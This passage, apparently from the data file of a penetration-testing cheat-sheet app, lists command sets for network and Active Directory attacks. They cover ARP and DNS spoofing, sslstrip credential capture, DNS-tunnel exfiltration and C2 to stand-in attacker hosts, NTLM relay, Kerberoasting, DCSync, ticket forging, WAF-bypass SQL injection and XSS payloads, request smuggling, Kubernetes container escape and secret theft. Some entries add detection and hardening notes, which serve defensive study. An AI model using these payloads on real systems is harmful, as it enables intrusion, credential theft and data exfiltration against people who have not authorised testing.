      tags: ['arp', 'mitm', 'spoofing', 'bettercap'], command: '# === ARP Spoofing with arpspoof ===\n# Enable IP forwarding first\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# Poison target (tell TARGET that we are the GATEWAY)\narpspoof -i eth0 -t TARGET_IP GATEWAY_IP\n# Poison gateway (tell GATEWAY that we are TARGET)\narpspoof -i eth0 -t GATEWAY_IP TARGET_IP\n\n# === Bettercap (modern framework) ===\nsudo bettercap -iface eth0\n\n# Inside bettercap:\nnet.probe on                    # Discover hosts\nnet.show                         # List discovered hosts\nset arp.spoof.targets TARGET_IP  # Set target\narp.spoof on                     # Start ARP spoofing\nnet.sniff on                     # Capture traffic\nset net.sniff.local true         # Include local traffic\n\n# HTTPS downgrade (sslstrip)\nset http.proxy.sslstrip true\nhttp.proxy on\n\n# Capture credentials\nset net.sniff.regexp .*password.*\n\n# === Ettercap ===\nsudo ettercap -T -i eth0 -M arp:remote /TARGET_IP// /GATEWAY_IP//\n\n# === Detection ===\n# arpwatch — monitor ARP changes\nsudo arpwatch -i eth0\n# Static ARP entries (prevention)\narp -s GATEWAY_IP GATEWAY_MAC',
      killchain: 'actions', attack: ['credential-access', 'collection'], pyramid: 'tools', owasp: [] },

    { id: 'dns-attacks', title: 'DNS Attacks & Poisoning', team: 'red', category: 'netattack',
      description: 'DNS spoofing, cache poisoning, DNS tunneling for data exfiltration, zone transfer attacks.',
      tags: ['dns', 'spoofing', 'poisoning', 'tunnel'], command: '# === DNS Zone Transfer (recon) ===\ndig axfr @ns1.target.com target.com\nhost -t axfr target.com ns1.target.com\n\n# === DNS Spoofing with Bettercap ===\nsudo bettercap -iface eth0\nset dns.spoof.domains target.com,*.target.com\nset dns.spoof.address ATTACKER_IP\ndns.spoof on\narp.spoof on\n\n# === DNSChef (standalone DNS proxy) ===\nsudo dnschef --fakeip ATTACKER_IP --fakedomains target.com -i 0.0.0.0\n\n# === DNS Tunneling (data exfiltration) ===\n# iodine — IP-over-DNS tunnel\n# Server (attacker):\niodined -f -c -P password 10.0.0.1 tunnel.attacker.com\n# Client (target):\niodine -f -P password tunnel.attacker.com\n\n# dnscat2 — C2 over DNS\n# Server:\nruby dnscat2.rb tunnel.attacker.com\n# Client:\n./dnscat --dns=server=ATTACKER_IP,port=53\n\n# === DNS Enumeration ===\ndnsenum target.com\ndnsrecon -d target.com -t std\nfierce --domain target.com\n\n# === Detection (Blue Team) ===\n# Monitor for: high DNS query volume, TXT record queries,\n# unusual subdomain lengths, queries to new/rare domains\n# Splunk: index=dns | stats count by query | where count > 1000',
      killchain: 'c2', attack: ['exfiltration', 'command-control'], pyramid: 'artifacts', owasp: [] },

    { id: 'vlan-hopping', title: 'VLAN Hopping & L2 Attacks', team: 'red', category: 'netattack',
      description: 'Layer 2 attacks: VLAN hopping (DTP), DHCP starvation, STP manipulation, MAC flooding.',
      tags: ['vlan', 'layer2', 'switch', 'dhcp'], command: '# === VLAN Hopping (Double Tagging) ===\n# Craft double-tagged 802.1Q frame\n# Only works when attacker is on native VLAN\nscapy:\n>>> packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="192.168.100.1")/ICMP()\n>>> sendp(packet, iface="eth0")\n\n# === DTP (Dynamic Trunking Protocol) Attack ===\n# Negotiate trunk mode with switch\nyersinia dtp -attack 1 -interface eth0\n# Or use Scapy to send DTP frames\n\n# === DHCP Starvation ===\n# Exhaust DHCP pool with fake MAC addresses\nyersinia dhcp -attack 1 -interface eth0\n# Or: dhcpig eth0\n\n# === DHCP Spoofing (Rogue DHCP) ===\n# After starvation, offer rogue DHCP with attacker as gateway\nyersinia dhcp -attack 2 -interface eth0\n\n# === MAC Flooding (CAM Table Overflow) ===\nmacof -i eth0\n# Fills switch CAM table → switch acts as hub → sniff all traffic\n\n# === STP Attack (Root Bridge) ===\nyersinia stp -attack 4 -interface eth0\n# Become root bridge → redirect all traffic\n\n# === Prevention (Blue Team) ===\n# Switch hardening:\n# - Disable DTP: switchport nonegotiate\n# - Port security: switchport port-security maximum 2\n# - DHCP snooping: ip dhcp snooping\n# - Dynamic ARP Inspection (DAI)\n# - BPDU Guard on access ports\n# - Private VLANs for isolation',
      killchain: 'actions', attack: ['lateral-movement', 'collection'], pyramid: 'ttps', owasp: [] },

    { id: 'responder-relay', title: 'Responder & NTLM Relay', team: 'red', category: 'netattack',
      description: 'LLMNR/NBT-NS poisoning with Responder, NTLM relay attacks with ntlmrelayx for credential theft.',
      tags: ['responder', 'ntlm', 'relay', 'llmnr'], command: '# === Responder — LLMNR/NBT-NS/mDNS Poisoning ===\n# Capture NTLMv2 hashes from network\nsudo responder -I eth0 -dwPv\n\n# Flags:\n# -d  Enable answers for DHCP broadcast requests\n# -w  Start WPAD rogue proxy server\n# -P  Force NTLM auth for WPAD\n# -v  Verbose\n\n# Hashes saved to: /usr/share/responder/logs/\n# Crack with hashcat:\nhashcat -m 5600 hash.txt wordlist.txt  # NTLMv2\n\n# === NTLM Relay (don\'t crack — relay!) ===\n# 1. Disable SMB and HTTP in Responder.conf first!\n# /etc/responder/Responder.conf: SMB = Off, HTTP = Off\n\n# 2. Start ntlmrelayx\nimpacket-ntlmrelayx -tf targets.txt -smb2support\n\n# Relay to specific target (get SAM dump)\nimpacket-ntlmrelayx -t smb://TARGET_IP -smb2support\n\n# Relay + execute command\nimpacket-ntlmrelayx -t smb://TARGET -smb2support -c "whoami"\n\n# Relay to LDAP (create machine account)\nimpacket-ntlmrelayx -t ldap://DC_IP --delegate-access\n\n# 3. Start Responder (with SMB/HTTP off)\nsudo responder -I eth0 -dwPv\n\n# === Detection ===\n# Monitor for LLMNR (UDP 5355) and NBT-NS (UDP 137) traffic\n# Disable LLMNR via GPO: Computer Config → Admin Templates → DNS Client\n# Disable NBT-NS: Network adapter → TCP/IPv4 → Advanced → WINS → Disable',
      killchain: 'c2', attack: ['credential-access', 'lateral-movement'], pyramid: 'tools', owasp: [] },

    { id: 'network-sniff', title: 'Network Sniffing & Credential Capture', team: 'red', category: 'netattack',
      description: 'Passive network sniffing: capture credentials, extract files from PCAP, protocol-specific harvesting.',
      tags: ['sniffing', 'pcap', 'credentials', 'wireshark'], command: '# === Passive Sniffing ===\n# Tcpdump — capture all traffic\nsudo tcpdump -i eth0 -w capture.pcap\n\n# Capture only authentication traffic\nsudo tcpdump -i eth0 port 21 or port 23 or port 25 or port 110 or port 143 -w auth.pcap\n\n# === Credential Extraction ===\n# PCredz — auto-extract creds from PCAP\npython3 Pcredz -f capture.pcap\n\n# Net-creds (sniff live)\nsudo python3 net-creds.py -i eth0\n\n# Wireshark display filters for creds:\n# FTP:  ftp.request.command == "PASS"\n# HTTP: http.request.method == "POST" && http contains "password"\n# SMTP: smtp.req.parameter contains "AUTH"\n# Telnet: telnet\n\n# === Extract Files from PCAP ===\n# Wireshark: File → Export Objects → HTTP/SMB/TFTP\n\n# NetworkMiner (GUI)\nNetworkMiner.exe capture.pcap\n\n# Foremost (carve files from PCAP)\nforemost -i capture.pcap -o extracted/\n\n# === HTTPS Interception (with ARP MITM) ===\n# Bettercap + hstshijack caplet\nsudo bettercap -iface eth0 -caplet hstshijack/hstshijack\n\n# === Detection ===\n# Look for promiscuous mode NICs:\nip link show | grep PROMISC\n# Network IDS: Snort, Suricata\n# Encrypted protocols prevent passive sniffing (use TLS everywhere)',
      killchain: 'actions', attack: ['credential-access', 'collection'], pyramid: 'tools', owasp: [] },

    // ── AD Attacks (Advanced) ────────────────────────────────
    { id: 'kerberoast', title: 'Kerberoasting', team: 'red', category: 'adattack',
      description: 'Request service tickets (TGS) for SPN accounts and crack offline — no admin required.',
      tags: ['kerberoast', 'kerberos', 'spn', 'active-directory'],
      commands: {
        linux: '# Impacket GetUserSPNs\nimpacket-GetUserSPNs -request -dc-ip DC_IP domain.local/user:password\nimpacket-GetUserSPNs -request -dc-ip DC_IP domain.local/user -hashes :NTLM_HASH\n\n# Output format: hashcat-compatible ($krb5tgs$23$*...)\n\n# Crack with hashcat\nhashcat -m 13100 kerberoast.txt wordlist.txt\nhashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule\n\n# John\njohn --format=krb5tgs --wordlist=wordlist.txt kerberoast.txt',
        windows: '# Rubeus\nRubeus.exe kerberoast /outfile:hashes.txt\nRubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt\n\n# PowerView (PowerSploit)\nGet-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv kerberoast.csv\n\n# Invoke-Kerberoast\nInvoke-Kerberoast -OutputFormat Hashcat | Select-Object -Expand Hash\n\n# Targeted — find high-value SPNs\nGet-DomainUser -SPN -AdminCount | Select-Object samaccountname, serviceprincipalname'
      },
      killchain: 'actions', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },

    { id: 'asrep-roast', title: 'AS-REP Roasting', team: 'red', category: 'adattack',
      description: 'Target accounts with Kerberos pre-auth disabled — request AS-REP and crack offline.',
      tags: ['asrep', 'kerberos', 'roasting', 'active-directory'],
      commands: {
        linux: '# Find accounts with pre-auth disabled\nimpacket-GetNPUsers -usersfile users.txt -dc-ip DC_IP domain.local/ -format hashcat\n\n# With credentials (enumerate automatically)\nimpacket-GetNPUsers -dc-ip DC_IP domain.local/user:password -request\n\n# Crack\nhashcat -m 18200 asrep.txt wordlist.txt\njohn --format=krb5asrep --wordlist=wordlist.txt asrep.txt',
        windows: '# Rubeus\nRubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n\n# PowerView — find vulnerable accounts\nGet-DomainUser -PreauthNotRequired | Select-Object samaccountname, distinguishedname\n\n# Set pre-auth disabled (if you have write perms)\nSet-DomainObject -Identity target_user -XOR @{userAccountControl=4194304}'
      },
      killchain: 'actions', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },

    { id: 'dcsync', title: 'DCSync — Domain Credential Dump', team: 'red', category: 'adattack',
      description: 'DCSync attack: replicate AD credentials using Directory Replication Service rights.',
      tags: ['dcsync', 'mimikatz', 'ntds', 'active-directory'], command: '# === DCSync with Mimikatz ===\n# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All\nmimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt\nmimikatz # lsadump::dcsync /domain:corp.local /user:Administrator\nmimikatz # lsadump::dcsync /domain:corp.local /all /csv\n\n# === DCSync with Impacket (Linux) ===\nimpacket-secretsdump -just-dc domain.local/admin:password@DC_IP\nimpacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC_IP\nimpacket-secretsdump -just-dc-user krbtgt domain.local/admin@DC_IP -hashes :HASH\n\n# === NTDS.dit extraction (alternative) ===\n# Volume Shadow Copy\nimpacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL\n\n# On DC (requires admin):\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\\n\n# === Detection ===\n# Event 4662: "Replicating Directory Changes" from non-DC\n# Monitor: DS-Replication-Get-Changes rights on domain object\n# Alert on any non-DC performing replication\nGet-WinEvent -FilterHashtable @{LogName="Security"; Id=4662} | Where-Object {$_.Message -match "Replicating Directory Changes"}',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },

    { id: 'golden-silver-ticket', title: 'Golden & Silver Ticket Attacks', team: 'red', category: 'adattack',
      description: 'Forge Kerberos tickets: Golden (TGT with krbtgt hash) and Silver (TGS with service hash).',
      tags: ['golden-ticket', 'silver-ticket', 'kerberos', 'mimikatz'], command: '# === Golden Ticket (forge TGT) ===\n# Requires: krbtgt NTLM hash + domain SID\n\n# Get domain SID\nwhoami /user\n# Or: Get-DomainSID (PowerView)\n\n# Forge Golden Ticket with Mimikatz\nmimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXXXX /krbtgt:NTLM_HASH /ptt\n\n# Impacket ticketer (Linux)\nimpacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXX -domain corp.local FakeAdmin\nexport KRB5CCNAME=FakeAdmin.ccache\nimpacket-psexec -k -no-pass corp.local/FakeAdmin@DC_HOSTNAME\n\n# === Silver Ticket (forge TGS) ===\n# Requires: service account NTLM hash + SPN\n\n# Forge Silver Ticket\nmimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXXXX /target:sql.corp.local /service:MSSQLSvc /rc4:SERVICE_NTLM /ptt\n\n# Common SPNs for Silver Tickets:\n# CIFS/host.domain — file share access\n# MSSQLSvc/host.domain — SQL Server\n# HTTP/host.domain — web services\n# HOST/host.domain — WMI, scheduled tasks\n\n# === Detection ===\n# Golden: TGT with abnormally long lifetime (Event 4769 with unusual encryption)\n# Silver: Service access without corresponding TGT request (Event 4769 without 4768)\n# Monitor for Event 4624 from non-existent users\n# Deploy: Advanced Audit Policy → Kerberos logging',
      killchain: 'actions', attack: ['persistence', 'privilege-escalation'], pyramid: 'ttps', owasp: [] },

    { id: 'bloodhound-enum', title: 'BloodHound — AD Attack Paths', team: 'red', category: 'adattack',
      description: 'BloodHound: enumerate Active Directory attack paths, find shortest path to Domain Admin.',
      tags: ['bloodhound', 'sharphound', 'active-directory', 'graph'],
      commands: {
        linux: '# === BloodHound Setup ===\n# Install (Docker — recommended)\ndocker run -p 7474:7474 -p 7687:7687 -e NEO4J_AUTH=neo4j/bloodhound specterops/bloodhound\n# Or: pip install bloodhound\n\n# === Collect Data (from Linux) ===\nbloodhound-python -d corp.local -u user -p password -dc dc01.corp.local -c all\n# Outputs: computers.json, users.json, groups.json, domains.json\n\n# === Upload to BloodHound ===\n# GUI: drag & drop JSON files\n# Or: Upload button → select all JSON files\n\n# === Key Queries ===\n# "Shortest Path to Domain Admin"\n# "Find all Domain Admins"\n# "Find Kerberoastable Users"\n# "Shortest Path from Owned to Domain Admin"\n# Right-click node → "Shortest Path to Here from Owned"',
        windows: '# === SharpHound Collector ===\nSharpHound.exe -c all --outputdirectory C:\\temp\nSharpHound.exe -c all --domain corp.local --ldapusername user --ldappassword pass\n\n# Collection methods:\n# all       — Everything\n# session   — Session data only\n# group     — Group memberships\n# trusts    — Domain trusts\n# acl       — ACL data\n\n# === PowerShell Collector ===\nImport-Module SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp\n\n# === Key Attack Paths to Look For ===\n# GenericAll / GenericWrite on users/groups\n# WriteDACL on domain object\n# AddMember on privileged groups\n# ForceChangePassword\n# Constrained/Unconstrained Delegation'
      },
      killchain: 'recon', attack: ['discovery', 'privilege-escalation'], pyramid: 'tools', owasp: [] },

    // ── WAF Bypass ───────────────────────────────────────────
    { id: 'waf-detect', title: 'WAF Detection & Fingerprinting', team: 'red', category: 'waf',
      description: 'Detect and identify Web Application Firewalls: wafw00f, header analysis, behavior testing.',
      tags: ['waf', 'detection', 'fingerprinting', 'web'], command: '# === wafw00f — WAF Fingerprinting ===\nwafw00f https://target.com\nwafw00f -l                    # List known WAFs\nwafw00f -a https://target.com # Aggressive detection\n\n# === Manual Detection ===\n# Check response headers\ncurl -sI https://target.com | grep -iE "x-waf|x-cdn|server|x-powered|x-sucuri|cf-ray"\n\n# Common WAF headers:\n# cf-ray / cf-cache → Cloudflare\n# x-sucuri-id → Sucuri\n# x-cdn / x-edge → Akamai\n# server: AkamaiGHost → Akamai\n# x-amz-cf-id → AWS CloudFront + WAF\n# server: awselb → AWS ALB/WAF\n\n# === Behavior Testing ===\n# Send obviously m_alicious payload, check response\ncurl -s "https://target.com/?id=<script>alert(1)</script>" -o /dev/null -w "%{http_code}"\n# 403/406/429 = likely WAF blocked\n\n# SQL injection test\ncurl -s "https://target.com/?id=1%27%20OR%201=1--" -o /dev/null -w "%{http_code}"\n\n# === Nmap WAF Detection ===\nnmap -p 80,443 --script http-waf-detect,http-waf-fingerprint target.com',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: [] },

    { id: 'waf-bypass-sqli', title: 'WAF Bypass — SQL Injection', team: 'red', category: 'waf',
      description: 'Techniques to bypass WAF SQL injection filters: encoding, comments, case manipulation.',
      tags: ['waf', 'sqli', 'bypass', 'encoding'], command: '# === Encoding Bypasses ===\n# URL double-encode\n1%2527%2520OR%25201%253D1--\n\n# Unicode encoding\n1\\\\u0027 OR 1\\\\u003D1--\n\n# Hex encoding\n0x31272d2d\n\n# === Comment Bypasses ===\n# Inline comments\n1\'/**/OR/**/1=1--\nUNI/**/ON SEL/**/ECT 1,2,3\n\n# MySQL specific\n1\' /*!50000OR*/ 1=1--\n\n# === Case & Function Manipulation ===\n1\' oR 1=1--\n1\' Or 1=1--\nSeLeCt * FrOm users\n\n# === Alternative Syntax ===\n# No spaces (use tabs, newlines, or /**/ )\n1\'%09OR%091=1--\n1\'%0AOR%0A1=1--\n\n# No quotes\n1 OR 1=1--\nSELECT * FROM users WHERE id=1 UNION SELECT CHAR(97,100,109,105,110)\n\n# No OR/AND\n1\' || 1=1--\n1\' && 1=1--\n\n# === SQLMap with tamper scripts ===\nsqlmap -u "https://target.com/?id=1" --tamper=space2comment,charencode\nsqlmap -u "https://target.com/?id=1" --tamper=between,randomcase\n\n# List tamper scripts\nsqlmap --list-tampers\n\n# Common tampers: space2comment, charencode, randomcase,\n# between, equaltolike, percentage, halfversionedmorekeywords',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A03'] },

    { id: 'waf-bypass-xss', title: 'WAF Bypass — XSS', team: 'red', category: 'waf',
      description: 'Bypass XSS filters: event handlers, tag variations, encoding, DOM-based, polyglots.',
      tags: ['waf', 'xss', 'bypass', 'web'], command: '# === Tag Variations ===\n<svg onload=alert(1)>\n<img src=x onerror=alert(1)>\n<body onload=alert(1)>\n<details open ontoggle=alert(1)>\n<marquee onstart=alert(1)>\n<video><source onerror=alert(1)>\n\n# === Event Handler Bypass ===\n<svg/onload=alert(1)>            # No space\n<img src=x>   # Quoted handler\n<img src=x onerror=alert`1`>     # Template literals\n\n# === Encoding Bypasses ===\n<script>\\\\u0061lert(1)</script>    # Unicode escape\n<img src=x onerror=&#97;lert(1)> # HTML entity\n<img src=x onerror=al\\\\x65rt(1)>  # Hex escape\n\n# === No Parentheses ===\n<img src=x>\n<img src=x onerror=alert\\\\x281\\\\x29>\n<svg/onload=location=`javascript:alert\\\\x281\\\\x29`>\n\n# === Polyglot XSS (catches multiple contexts) ===\njaVasCript:/*-/*`/*\\\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\\\x3csVg/<sVg/oNloAd=alert()//>\\\\x3e\n\n# === DOM-based (bypass server WAF entirely) ===\nhttps://target.com/page#<img src=x onerror=alert(1)>\n# If page uses: document.getElementById("x").innerHTML = location.hash\n\n# === Mutation XSS (browser parser tricks) ===\n<noscript><p title="</noscript><img src=x onerror=alert(1)>">\n\n# === WAF testing tool ===\n# https://github.com/s0md3v/XSStrike\npython3 xsstrike.py -u "https://target.com/?q=test"',
      killchain: 'exploitation', attack: ['initial-access', 'execution'], pyramid: 'ttps', owasp: ['A03', 'A07'] },

    { id: 'waf-bypass-general', title: 'WAF Bypass — General Techniques', team: 'red', category: 'waf',
      description: 'Generic WAF evasion: HTTP smuggling, chunked encoding, IP rotation, origin discovery.',
      tags: ['waf', 'bypass', 'evasion', 'http-smuggling'], command: '# === Find Origin IP (bypass CDN/WAF) ===\n# DNS history\ncurl -s "https://securitytrails.com/domain/target.com/history/a" | grep -oP "\\d+\\.\\d+\\.\\d+\\.\\d+"\n\n# Shodan / Censys for SSL cert\nshodan search ssl.cert.subject.CN:target.com\n\n# Check subdomains that might not be behind WAF\ndig mail.target.com\ndig dev.target.com\ndig staging.target.com\n\n# === HTTP Request Smuggling ===\n# CL.TE (Content-Length vs Transfer-Encoding)\n# If front-end uses CL, back-end uses TE:\nPOST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin\n\n# === Chunked Encoding Bypass ===\ncurl -H "Transfer-Encoding: chunked" -X POST -d "7\\r\\nmalicio\\r\\n4\\r\\nus_p\\r\\n6\\r\\nayload\\r\\n0\\r\\n\\r\\n" https://target.com/\n\n# === HTTP/2 Specific ===\n# Some WAFs only inspect HTTP/1.1\ncurl --http2 "https://target.com/?id=1\' OR 1=1--"\n\n# === Header Manipulation ===\n# X-Forwarded-For spoofing (trust chain bypass)\ncurl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin\ncurl -H "X-Original-URL: /admin" https://target.com/\n\n# === Rate Limit Bypass ===\n# Rotate IP header\ncurl -H "X-Forwarded-For: $(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1)" https://target.com/',
      killchain: 'delivery', attack: ['defense-evasion', 'initial-access'], pyramid: 'ttps', owasp: ['A05'] },

    // ── Kubernetes Security ──────────────────────────────────
    { id: 'k8s-pentest', title: 'Kubernetes Pentest Enumeration', team: 'red', category: 'k8s',
      description: 'Deep Kubernetes enumeration: API server, RBAC, secrets, pods, service accounts from inside/outside.',
      tags: ['kubernetes', 'k8s', 'enumeration', 'rbac'], command: '# === API Server Discovery ===\n# From inside a pod:\nenv | grep KUBERNETES\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\ncat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\ncat /var/run/secrets/kubernetes.io/serviceaccount/namespace\n\n# === kubectl Enumeration ===\nkubectl cluster-info\nkubectl get nodes -o wide\nkubectl get namespaces\nkubectl get pods --all-namespaces\nkubectl get services --all-namespaces\nkubectl get secrets --all-namespaces\n\n# === RBAC Enumeration ===\nkubectl auth can-i --list           # What can I do?\nkubectl auth can-i create pods       # Specific check\nkubectl get clusterroles\nkubectl get clusterrolebindings\nkubectl get rolebindings -A\n\n# === Secret Extraction ===\nkubectl get secret <name> -o jsonpath=\'{.data}\'\n# Base64 decode\nkubectl get secret <name> -o jsonpath=\'{.data.password}\' | base64 -d\n\n# === From inside a pod (no kubectl) ===\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\ncurl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces\ncurl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets\n\n# === Service Account Abuse ===\nkubectl get serviceaccounts -A\nkubectl get pods -o jsonpath=\'{.items[*].spec.serviceAccountName}\'',
      killchain: 'recon', attack: ['discovery', 'credential-access'], pyramid: 'ttps', owasp: [] },

    { id: 'k8s-attack', title: 'Kubernetes Attack Techniques', team: 'red', category: 'k8s',
      description: 'K8s attacks: container escape, pod exec, mount host filesystem, deploy m_alicious pods.',
      tags: ['kubernetes', 'k8s', 'container-escape', 'attack'], command: '# === Pod Command Execution ===\nkubectl exec -it <pod-name> -- /bin/bash\nkubectl exec <pod-name> -- cat /etc/shadow\n\n# === Deploy Privileged Pod (if RBAC allows) ===\nkubectl apply -f - <<EOF\napiVersion: v1\nkind: Pod\nmetadata:\n  name: evil-pod\nspec:\n  containers:\n  - name: evil\n    image: ubuntu\n    command: ["sleep", "infinity"]\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - name: host-root\n      mountPath: /host\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /\nEOF\n# Access host filesystem: ls /host/\n\n# === Container Escape (privileged) ===\n# Mount host filesystem\nmount /dev/sda1 /mnt\nchroot /mnt\n\n# === Exploit mounted Docker socket ===\nls -la /var/run/docker.sock\n# If accessible:\ncurl -s --unix-socket /var/run/docker.sock http://localhost/containers/json\n\n# === Steal ConfigMaps & Secrets ===\nkubectl get configmaps -A -o yaml\nkubectl get secrets -A -o yaml\n\n# === Create privileged service account ===\nkubectl create clusterrolebinding evil-admin --clusterrole=cluster-admin --serviceaccount=default:default',
      killchain: 'exploitation', attack: ['privilege-escalation', 'execution'], pyramid: 'ttps', owasp: [] },

    { id: 'k8s-hardening', title: 'Kubernetes Hardening', team: 'blue', category: 'k8s',
      description: 'Kubernetes security hardening: Pod Security Standards, NetworkPolicies, RBAC, scanning.',
      tags: ['kubernetes', 'k8s', 'hardening', 'security'], command: '# === Pod Security Standards (PSS) ===\n# Enforce restricted mode on namespace\nkubectl label namespace production pod-security.kubernetes.io/enforce=restricted\nkubectl label namespace production pod-security.kubernetes.io/warn=restricted\n\n# === Network Policies (deny all by default) ===\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: deny-all\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n\n# === RBAC — Least Privilege ===\n# Audit current permissions\nkubectl auth can-i --list --as=system:serviceaccount:default:default\n# Remove default service account auto-mount\nautomountServiceAccountToken: false\n\n# === Security Scanning ===\n# kube-bench — CIS Kubernetes Benchmark\nkube-bench run --targets=master,node\n\n# Trivy — scan images + k8s misconfig\ntrivy k8s --report summary cluster\ntrivy image nginx:latest\n\n# kubeaudit — audit security config\nkubeaudit all\n\n# === Secrets Management ===\n# Never store secrets in YAML — use:\n# - External Secrets Operator\n# - Sealed Secrets\n# - Vault (HashiCorp)\n\n# === Runtime Protection ===\n# Falco — detect anomalous behavior\nhelm install falco falcosecurity/falco\n# Monitors: shell spawns in containers, sensitive file access,\n# unexpected network connections, privilege escalation',
      killchain: 'actions', attack: ['defense-evasion', 'persistence'], pyramid: 'ttps', owasp: [] },

    { id: 'k8s-forensics', title: 'Kubernetes Incident Response', team: 'blue', category: 'k8s',
      description: 'K8s incident response: audit logs, pod forensics, snapshot containers, network analysis.',
      tags: ['kubernetes', 'k8s', 'incident-response', 'forensics'], command: '# === Audit Logs ===\n# Check API server audit log\nkubectl logs -n kube-system kube-apiserver-master | grep -i "create\\|delete\\|exec"\n\n# Common suspicious events:\n# - Pod exec into running containers\n# - Secret access from unusual service accounts\n# - ClusterRoleBinding creation\n# - Pod creation with privileged flag\n\n# === Pod Investigation ===\n# Get pod events\nkubectl describe pod suspicious-pod\nkubectl logs suspicious-pod --all-containers --previous\n\n# Snapshot running container for analysis\nkubectl debug -it suspicious-pod --image=busybox --target=main-container\n\n# Copy files from pod\nkubectl cp default/suspicious-pod:/tmp/malware.sh /evidence/malware.sh\n\n# === Network Investigation ===\n# Check network policies\nkubectl get networkpolicies -A\n\n# DNS queries from pods\nkubectl logs -n kube-system -l k8s-app=kube-dns --tail=1000 | grep suspicious-pod\n\n# === Containment ===\n# Isolate pod (deny all network)\nkubectl apply -f - <<EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: isolate-pod\nspec:\n  podSelector:\n    matchLabels:\n      app: suspicious-app\n  policyTypes:\n  - Ingress\n  - Egress\nEOF\n\n# Delete compromised pod (after evidence collection)\nkubectl delete pod suspicious-pod --grace-period=0 --force\n\n# === Tools ===\n# Sysdig Inspect — container forensics\n# Falco — runtime detection\n# kube-hunter — penetration testing\nkube-hunter --remote TARGET_IP',
      killchain: 'actions', attack: ['collection', 'discovery'], pyramid: 'ttps', owasp: [] },

    // ── Automation & Scripting ───────────────────────────────
    { id: 'bash-oneliners', title: 'Bash One-Liners for Pentest', team: 'red', category: 'automation',
      description: 'Essential bash one-liners: port scanning, brute force, file search, data extraction, automation.',
      tags: ['bash', 'one-liner', 'scripting', 'automation'], command: '# === Port Scanning (no nmap) ===\n# Bash TCP scan\nfor port in $(seq 1 65535); do (echo >/dev/tcp/TARGET/$port) 2>/dev/null && echo "OPEN: $port"; done\n\n# Top 100 ports quick scan\nfor port in 21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1723 3306 3389 5432 5900 8080 8443; do\n  (echo >/dev/tcp/TARGET/$port) 2>/dev/null && echo "$port open"\ndone\n\n# === Ping Sweep ===\nfor i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i | grep "from" &; done; wait\n\n# === Brute Force Patterns ===\n# HTTP Basic Auth\nwhile read pass; do\n  code=$(curl -s -o /dev/null -w "%{http_code}" -u admin:$pass https://target/admin)\n  [ "$code" = "200" ] && echo "FOUND: $pass" && break\ndone < wordlist.txt\n\n# === Data Extraction ===\n# Extract IPs from file\ngrep -oP \'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\' file.txt | sort -u\n\n# Extract emails\ngrep -oP \'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}\' file.txt | sort -u\n\n# Extract URLs\ngrep -oP \'https?://[^\\s<>"]+\' file.txt | sort -u\n\n# === File Operations ===\n# Find files modified in last 24h\nfind / -mtime -1 -type f 2>/dev/null\n\n# Find world-writable files\nfind / -perm -o+w -type f 2>/dev/null\n\n# Base64 encode file for transfer\nbase64 -w0 < secret.txt',
      killchain: 'actions', attack: ['execution', 'discovery'], pyramid: 'tools', owasp: [] },

    { id: 'python-pentest', title: 'Python Security Scripts', team: 'red', category: 'automation',
      description: 'Python snippets for pentesting: socket scanner, HTTP fuzzer, reverse shell, hash cracker.',
